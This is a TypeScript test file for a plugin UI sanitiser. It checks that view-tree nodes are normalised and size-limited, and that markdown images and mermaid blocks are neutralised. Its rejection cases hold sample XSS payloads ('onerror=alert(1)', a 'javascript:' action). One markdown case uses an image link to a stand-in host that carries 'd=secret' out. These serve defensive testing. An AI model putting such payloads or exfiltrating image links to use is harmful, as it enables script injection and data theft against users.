import { describe, expect, it } from "vitest";
import { VIEW_TREE_LIMITS, ViewTreeError, groupBadges, sanitizePluginMarkdown, sanitizeViewTree } from "./viewTree";

describe("sanitizeViewTree", () => {
  it("normalises every supported node type", () => {
    const tree = sanitizeViewTree([
      { type: "heading", text: "Stats" },
      { type: "text", text: "Hello", tone: "muted" },
      { type: "list", items: ["one", { text: "two", meta: "2", indent: 1 }], ordered: true },
      { type: "button", label: "Go", actionId: "go.now" },
      { type: "badge", text: "New", variant: "accent" },
      { type: "divider" },
      { type: "markdown", content: "**bold**" },
    ]);
    expect(tree).toEqual([
      { type: "heading", text: "Stats", level: 2 },
      { type: "text", text: "Hello", tone: "muted" },
      {
        type: "list",
        ordered: true,
        items: [
          { text: "one", meta: null, indent: 0 },
          { text: "two", meta: "2", indent: 1 },
        ],
      },
      { type: "button", label: "Go", actionId: "go.now", variant: "secondary" },
      { type: "badge", text: "New", variant: "accent" },
      { type: "divider" },
      { type: "markdown", content: "**bold**" },
    ]);
  });

  it("accepts a single node and clears on null", () => {
    expect(sanitizeViewTree({ type: "divider" })).toEqual([{ type: "divider" }]);
    expect(sanitizeViewTree(null)).toEqual([]);
  });

  it("rejects unknown node types and any HTML-carrying field", () => {
    const bad: [unknown, string][] = [
      [{ type: "html", html: "<b>x</b>" }, 'unknown type "html"'],
      [{ type: "text", text: "x", html: "<img src=x onerror=alert(1)>" }, 'unknown field "html"'],
      [{ type: "text", text: "x", dangerouslySetInnerHTML: { __html: "<b>" } }, "unknown field"],
      [{ type: "text", text: { toString: () => "x" } }, "must be a string"],
      [{ type: "button", label: "x", actionId: "javascript:alert(1)" }, "actionId may only use"],
      [{ type: "button", label: "x", actionId: "a", variant: "primary" }, "variant"],
      [{ type: "heading", text: "x", level: 7 }, "level must be"],
      [{ type: "list", items: [{ text: "x", indent: 9 }] }, "indent"],
      [{ type: "badge", text: "x", variant: "neon" }, "badge variant"],
      ["just a string", "must be an object"],
    ];
    for (const [input, message] of bad) {
      expect(() => sanitizeViewTree(input), JSON.stringify(input)).toThrow(ViewTreeError);
      expect(() => sanitizeViewTree(input)).toThrow(message);
    }
  });

  it("enforces size limits", () => {
    expect(() => sanitizeViewTree(new Array(VIEW_TREE_LIMITS.nodes + 1).fill({ type: "divider" }))).toThrow("at most");
    expect(() => sanitizeViewTree({ type: "text", text: "x".repeat(VIEW_TREE_LIMITS.text + 1) })).toThrow("longer than");
    expect(() => sanitizeViewTree({ type: "list", items: new Array(VIEW_TREE_LIMITS.listItems + 1).fill("x") })).toThrow(
      "more than"
    );
  });

  it("groups consecutive badges into one row", () => {
    const grouped = groupBadges(
      sanitizeViewTree([
        { type: "badge", text: "a" },
        { type: "badge", text: "b" },
        { type: "divider" },
        { type: "badge", text: "c" },
      ])
    );
    expect(grouped.map((n) => n.type)).toEqual(["badges", "divider", "badges"]);
  });
});

describe("sanitizePluginMarkdown", () => {
  it("replaces images with their alt text and neutralises mermaid", () => {
    expect(sanitizePluginMarkdown("See ![a chart](https://evil.example/leak?d=secret) now")).toBe("See a chart now");
    expect(sanitizePluginMarkdown("![ref][img]")).toBe("ref");
    expect(sanitizePluginMarkdown("```mermaid\ngraph TD;\n```")).toBe("```text\ngraph TD;\n```");
    expect(sanitizePluginMarkdown("plain [link](https://x.dev)")).toBe("plain [link](https://x.dev)");
  });
});
